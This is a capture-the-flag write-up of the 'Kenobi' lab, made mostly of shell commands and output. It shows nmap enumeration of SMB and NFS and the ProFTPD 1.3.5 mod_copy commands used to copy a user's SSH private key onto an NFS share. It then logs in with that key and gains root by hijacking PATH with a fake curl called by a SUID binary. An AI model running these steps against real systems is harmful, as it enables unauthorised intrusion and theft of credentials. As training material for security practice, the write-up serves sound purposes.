# Kenobi
## Task1
### check ports.
```shell
$ nmap -sC -sV -Pn 10.10.220.199
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-15 14:11 JST
Nmap scan report for 10.10.220.199
Host is up (0.25s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      33053/tcp6  mountd
|   100005  1,2,3      51931/tcp   mountd
|   100005  1,2,3      53215/udp   mountd
|   100005  1,2,3      59654/udp6  mountd
|   100021  1,3,4      38198/udp6  nlockmgr
|   100021  1,3,4      40717/tcp   nlockmgr
|   100021  1,3,4      46455/tcp6  nlockmgr
|   100021  1,3,4      49060/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2021-08-15T00:11:47-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-15T05:11:47
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.42 seconds
```

## Task2
### check samba.
```shell
$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.220.199Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-15 14:14 JST
Nmap scan report for 10.10.220.199
Host is up (0.25s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.220.199\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.220.199\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.220.199\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 38.12 seconds
```

```shell
$ smbclient //10.10.220.199/anonymous -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 19:49:09 2019
  ..                                  D        0  Wed Sep  4 19:56:07 2019
  log.txt                             N    12237  Wed Sep  4 19:49:09 2019

                9204224 blocks of size 1024. 6877108 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (12.0 KiloBytes/sec) (average 12.0 KiloBytes/sec)
smb: \> exit
$ cat log.txt
```

```shell
$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.220.199
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-15 14:18 JST
Nmap scan report for 10.10.220.199
Host is up (0.25s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 3.60 seconds
```

## Task3
### connect ftp.
```shell
$ nc 10.10.220.199 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.220.199]
```
```shell
$ searchsploit proftpd 1.3.5
----------------------------------------------------- ---------------------------------
 Exploit Title                                       |  Path
----------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasp | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution  | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                            | linux/remote/36742.txt
----------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
### connect ssh.
```shell
$ nc 10.10.220.199 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.220.199]
SITE CPFR /home/kenobi/.ssh.id_rsa
550 /home/kenobi/.ssh.id_rsa: No such file or directory
                                                            
500 Invalid command: try being more creative
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

### Get kenobi FLG.
```shell
$ sudo mkdir /mnt/kenobiNF5
$ sudo mount 10.10.220.199:/var /mnt/kenobiNF5
$ ls -la /mnt/kenobiNF5
合計 56
drwxr-xr-x 14 root root    4096  9月  4  2019 .
drwxr-xr-x  6 root root    4096  8月 15 14:25 ..
drwxr-xr-x  2 root root    4096  9月  4  2019 backups
drwxr-xr-x  9 root root    4096  9月  4  2019 cache
drwxrwxrwt  2 root root    4096  9月  4  2019 crash
drwxr-xr-x 40 root root    4096  9月  4  2019 lib
drwxrwsr-x  2 root staff   4096  4月 13  2016 local
lrwxrwxrwx  1 root root       9  9月  4  2019 lock -> /run/lock
drwxrwxr-x 10 root crontab 4096  9月  4  2019 log
drwxrwsr-x  2 root mail    4096  2月 27  2019 mail
drwxr-xr-x  2 root root    4096  2月 27  2019 opt
lrwxrwxrwx  1 root root       4  9月  4  2019 run -> /run
drwxr-xr-x  2 root root    4096  1月 30  2019 snap
drwxr-xr-x  5 root root    4096  9月  4  2019 spool
drwxrwxrwt  6 root root    4096  8月 15 14:23 tmp
drwxr-xr-x  3 root root    4096  9月  4  2019 www
$ cp /mnt/kenobiNF5/tmp/id_rsa ~/
$ chmod 600 ~/id_rsa
$ ssh -i ~/id_rsa kenobi@10.10.220.199
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt 
```

### Get root FLG.
```shell
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```
```shell
kenobi@kenobi:~$ strings /usr/bin/menu
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
```
```shell
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/bash > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@kenobi:/tmp# whoami
root
root@kenobi:~# pwd
/home/kenobi
root@kenobi:~# cat /root/root.txt
```
